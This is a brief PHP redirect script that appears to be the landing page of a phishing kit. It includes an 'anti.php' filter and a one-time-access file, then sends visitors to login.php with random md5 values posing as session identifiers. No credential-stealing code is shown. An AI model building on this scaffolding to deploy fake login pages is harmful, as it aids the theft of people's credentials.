<?php
error_reporting(0);
session_start();
include "One_Time.php";
include 'anti.php';

$_SESSION['token'] = "access";
 $praga=rand();
 $praga=md5($praga);

    
    
header("Location: login.php?id=$praga$praga&session=$praga$praga");   
    

?>
   